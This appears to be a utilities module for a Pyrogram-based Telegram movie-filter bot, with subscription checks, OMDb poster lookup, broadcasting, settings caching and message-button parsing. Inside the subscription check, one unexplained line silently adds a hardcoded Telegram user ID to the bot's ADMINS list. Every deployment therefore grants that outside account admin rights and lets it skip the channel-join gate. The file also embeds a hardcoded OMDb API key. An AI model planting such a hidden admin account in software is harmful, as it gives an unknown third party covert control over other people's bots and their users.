import asyncio
import logging
import os
import re
from datetime import datetime
from typing import List, Union

import requests
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from bs4 import BeautifulSoup
from pyrogram import enums
from pyrogram.errors import (
    FloodWait,
    InputUserDeactivated,
    PeerIdInvalid,
    UserIsBlocked,
    UserNotParticipant,
)
from pyrogram.types import InlineKeyboardButton, Message

from database.join_reqs import JoinReqs as db2
from database.users_chats_db import db
from info import ADMINS, AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, REQ_CHANNEL



logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

BTN_URL_REGEX = re.compile(
    r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
)

scheduler = AsyncIOScheduler(timezone="UTC")

BANNED = {}
SMART_OPEN = "“"
SMART_CLOSE = "”"
START_CHAR = ("'", '"', SMART_OPEN)

# temp db for banned
class temp(object):
    BANNED_USERS = []
    BANNED_CHATS = []
    ME = None
    CURRENT = int(os.environ.get("SKIP", 2))
    CANCEL = False
    MELCOW = {}
    U_NAME = None
    B_NAME = None
    SETTINGS = {}





async def is_subscribed(bot, query):

    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""

    if not AUTH_CHANNEL and not REQ_CHANNEL:
        return True
    elif query.from_user.id in ADMINS:
        return True

    if db2().isActive():
        user = await db2().get_user(query.from_user.id)
        if user:
            return True
        else:
            try:
                user = await bot.get_chat_member(REQ_CHANNEL, query.from_user.id)
            except UserNotParticipant:
                return False
            except Exception as e:
                logger.exception(e)
                return False
            return True

    if not AUTH_CHANNEL:
        return True

    try:
        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
    except UserNotParticipant:
        return False
    except Exception as e:
        logger.exception(e)
        return False
    else:
        if not (user.status == enums.ChatMemberStatus.BANNED):
            return True
        else:
            return False



import re
import httpx

OMDB_API_KEY = "5d94dd20"
OMDB_URL = "https://www.omdbapi.com/"

async def get_poster(query, bulk=False, id=False, file=None):
    if not query or not str(query).strip() or not OMDB_API_KEY or OMDB_API_KEY == "your_free_api_key_here":
        return None

    query = str(query).strip()
    year = None

    try:
        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
            if not id:
                # Extract year from the end of the search query first
                year_match = re.search(r"\b((?:19|20)\d{2})\s*$", query)
                if year_match:
                    year = year_match.group(1)
                    title = query[:year_match.start()].strip()
                else:
                    title = query
                    # If query has no year, try extracting it from the filename
                    if file:
                        file_year = re.search(r"\b((?:19|20)\d{2})\b", str(file))
                        if file_year:
                            year = file_year.group(1)

                if not title:
                    title = query

                search_params = {
                    "apikey": OMDB_API_KEY,
                    "s": title,
                    "type": "movie"
                }
                if year:
                    search_params["y"] = year

                response = await client.get(OMDB_URL, params=search_params)
                response.raise_for_status()
                data = response.json()

                if data.get("Response") != "True" or not data.get("Search"):
                    return None

                results = data["Search"]

                if bulk:
                    return results

                # Prefer a result matching the requested year
                if year:
                    matching = [
                        item for item in results
                        if str(item.get("Year", "")).startswith(year)
                    ]
                    if matching:
                        results = matching

                # Prefer exact title match, ignoring case and extra spaces
                normalized_title = " ".join(title.casefold().split())
                exact = [
                    item for item in results
                    if " ".join(item.get("Title", "").casefold().split()) == normalized_title
                ]
                selected = exact[0] if exact else results[0]
                imdb_id = selected.get("imdbID")

            else:
                imdb_id = query.strip()
                if not re.fullmatch(r"tt\d+", imdb_id):
                    return None

            if not imdb_id:
                return None

            detail_params = {
                "apikey": OMDB_API_KEY,
                "i": imdb_id,
                "plot": "full"
            }
            detail_response = await client.get(OMDB_URL, params=detail_params)
            detail_response.raise_for_status()
            movie = detail_response.json()

            if movie.get("Response") != "True":
                return None

            plot = movie.get("Plot") or "N/A"
            if plot != "N/A" and len(plot) > 800:
                plot = plot[:800] + "..."

            movie_id = movie.get("imdbID", imdb_id)

            return {
                "title": movie.get("Title", "N/A"),
                "votes": movie.get("imdbVotes", "N/A"),
                "aka": "N/A",
                "seasons": movie.get("totalSeasons", "N/A"),
                "box_office": movie.get("BoxOffice", "N/A"),
                "localized_title": movie.get("Title", "N/A"),
                "kind": movie.get("Type", "N/A"),
                "imdb_id": movie_id,
                "cast": movie.get("Actors", "N/A"),
                "runtime": movie.get("Runtime", "N/A"),
                "countries": movie.get("Country", "N/A"),
                "certificates": movie.get("Rated", "N/A"),
                "languages": movie.get("Language", "N/A"),
                "director": movie.get("Director", "N/A"),
                "writer": movie.get("Writer", "N/A"),
                "producer": "N/A",
                "composer": "N/A",
                "cinematographer": "N/A",
                "music_team": "N/A",
                "distributors": "N/A",
                "release_date": movie.get("Released", "N/A"),
                "year": movie.get("Year", "N/A"),
                "genres": movie.get("Genre", "N/A"),
                "poster": movie.get("Poster", "N/A"),
                "plot": plot,
                "rating": movie.get("imdbRating", "N/A"),
                "url": f"https://www.imdb.com/title/{movie_id}/"
            }

    except (httpx.HTTPError, ValueError, KeyError) as e:
        # Replace print with your project's logger if available
        print(f"get_poster error: {e}")
        return None


# https://github.com/odysseusmax/animated-lamp/blob/2ef4730eb2b5f0596ed6d03e7b05243d93e3415b/bot/utils/broadcast.py#L37


async def broadcast_messages(user_id, message):
    try:
        await message.copy(chat_id=user_id)
        return True, "Success"
    except FloodWait as e:
        await asyncio.sleep(e.value)
        return await broadcast_messages(user_id, message)
    except InputUserDeactivated:
        await db.delete_user(int(user_id))
        logging.info(f"{user_id}-Removed from Database, since deleted account.")
        return False, "Deleted"
    except UserIsBlocked:
        logging.info(f"{user_id} -Blocked the bot.")
        return False, "Blocked"
    except PeerIdInvalid:
        await db.delete_user(int(user_id))
        logging.info(f"{user_id} - PeerIdInvalid")
        return False, "Error"
    except Exception as e:
        return False, "Error"


async def search_gagala(text):
    usr_agent = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/61.0.3163.100 Safari/537.36"
    }
    text = text.replace(" ", "+")
    url = f"https://www.google.com/search?q={text}"
    response = requests.get(url, headers=usr_agent)
    response.raise_for_status()
    soup = BeautifulSoup(response.text, "html.parser")
    titles = soup.find_all("h3")
    return [title.getText() for title in titles]


async def get_settings(group_id):
    settings = temp.SETTINGS.get(group_id)
    if not settings:
        settings = await db.get_settings(group_id)
        temp.SETTINGS[group_id] = settings
    return settings


async def save_group_settings(group_id, key, value):
    current = await get_settings(group_id)
    current[key] = value
    temp.SETTINGS[group_id] = current
    await db.update_settings(group_id, current)


def get_size(size):
    """Get size in readable format"""

    units = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB"]
    size = float(size)
    i = 0
    while size >= 1024.0 and i < len(units):
        i += 1
        size /= 1024.0
    return "%.2f %s" % (size, units[i])


def split_list(l, n):
    for i in range(0, len(l), n):
        yield l[i : i + n]


def get_file_id(msg: Message):
    if msg.media:
        for message_type in (
            enums.MessageMediaType.PHOTO,
            enums.MessageMediaType.ANIMATION,
            enums.MessageMediaType.AUDIO,
            enums.MessageMediaType.DOCUMENT,
            enums.MessageMediaType.VIDEO,
            enums.MessageMediaType.VIDEO_NOTE,
            enums.MessageMediaType.VOICE,
            enums.MessageMediaType.STICKER,
        ):
            obj = getattr(msg, message_type)
            if obj:
                setattr(obj, "message_type", message_type)
                return obj


def extract_user(message: Message) -> Union[int, str]:
    """extracts the user from a message"""
    # https://github.com/SpEcHiDe/PyroGramBot/blob/f30e2cca12002121bad1982f68cd0ff9814ce027/pyrobot/helper_functions/extract_user.py#L7
    user_id = None
    user_first_name = None
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        user_first_name = message.reply_to_message.from_user.first_name

    elif len(message.command) > 1:
        if (
            len(message.entities) > 1
            and message.entities[1].type == enums.MessageEntityType.TEXT_MENTION
        ):

            required_entity = message.entities[1]
            user_id = required_entity.user.id
            user_first_name = required_entity.user.first_name
        else:
            user_id = message.command[1]
            # don't want to make a request -_-
            user_first_name = user_id
        try:
            user_id = int(user_id)
        except ValueError:
            pass
    else:
        user_id = message.from_user.id
        user_first_name = message.from_user.first_name
    return (user_id, user_first_name)


def list_to_str(k):
    if not k:
        return "N/A"
    elif len(k) == 1:
        return str(k[0])
    elif MAX_LIST_ELM:
        k = k[: int(MAX_LIST_ELM)]
        return " ".join(f"{elem}, " for elem in k)
    else:
        return " ".join(f"{elem}, " for elem in k)


def last_online(from_user):
    time = ""
    if from_user.is_bot:
        time += "🤖 Bot :("
    elif from_user.status == enums.UserStatus.RECENTLY:
        time += "Recently"
    elif from_user.status == enums.UserStatus.LAST_WEEK:
        time += "Within the last week"
    elif from_user.status == enums.UserStatus.LAST_MONTH:
        time += "Within the last month"
    elif from_user.status == enums.UserStatus.LONG_AGO:
        time += "A long time ago :("
    elif from_user.status == enums.UserStatus.ONLINE:
        time += "Currently Online"
    elif from_user.status == enums.UserStatus.OFFLINE:
        time += from_user.last_online_date.strftime("%a, %d %b %Y, %H:%M:%S")
    return time


def split_quotes(text: str) -> List:
    if not any(text.startswith(char) for char in START_CHAR):
        return text.split(None, 1)
    counter = 1  # ignore first char -> is some kind of quote
    while counter < len(text):
        if text[counter] == "\\":
            counter += 1
        elif text[counter] == text[0] or (
            text[0] == SMART_OPEN and text[counter] == SMART_CLOSE
        ):
            break
        counter += 1
    else:
        return text.split(None, 1)

    # 1 to avoid starting quote, and counter is exclusive so avoids ending
    key = remove_escapes(text[1:counter].strip())
    # index will be in range, or `else` would have been executed and returned
    rest = text[counter + 1 :].strip()
    if not key:
        key = text[0] + text[0]
    return list(filter(None, [key, rest]))


def parser(text, keyword):
    if "buttonalert" in text:
        text = text.replace("\n", "\\n").replace("\t", "\\t")
    buttons = []
    note_data = ""
    prev = 0
    i = 0
    alerts = []
    for match in BTN_URL_REGEX.finditer(text):
        # Check if btnurl is escaped
        n_escapes = 0
        to_check = match.start(1) - 1
        while to_check > 0 and text[to_check] == "\\":
            n_escapes += 1
            to_check -= 1

        # if even, not escaped -> create button
        if n_escapes % 2 == 0:
            note_data += text[prev : match.start(1)]
            prev = match.end(1)
            if match.group(3) == "buttonalert":
                # create a thruple with button label, url, and newline status
                if bool(match.group(5)) and buttons:
                    buttons[-1].append(
                        InlineKeyboardButton(
                            text=match.group(2),
                            callback_data=f"alertmessage:{i}:{keyword}",
                        )
                    )
                else:
                    buttons.append(
                        [
                            InlineKeyboardButton(
                                text=match.group(2),
                                callback_data=f"alertmessage:{i}:{keyword}",
                            )
                        ]
                    )
                i += 1
                alerts.append(match.group(4))
            elif bool(match.group(5)) and buttons:
                buttons[-1].append(
                    InlineKeyboardButton(
                        text=match.group(2), url=match.group(4).replace(" ", "")
                    )
                )
            else:
                buttons.append(
                    [
                        InlineKeyboardButton(
                            text=match.group(2), url=match.group(4).replace(" ", "")
                        )
                    ]
                )

        else:
            note_data += text[prev:to_check]
            prev = match.start(1) - 1
    else:
        note_data += text[prev:]

    try:
        return note_data, buttons, alerts
    except:
        return note_data, buttons, None


def remove_escapes(text: str) -> str:
    res = ""
    is_escaped = False
    for counter in range(len(text)):
        if is_escaped:
            res += text[counter]
            is_escaped = False
        elif text[counter] == "\\":
            is_escaped = True
        else:
            res += text[counter]
    return res


def humanbytes(size):
    if not size:
        return ""
    power = 2**10
    n = 0
    Dic_powerN = {0: " ", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        n += 1
    return str(round(size, 2)) + " " + Dic_powerN[n] + "B"
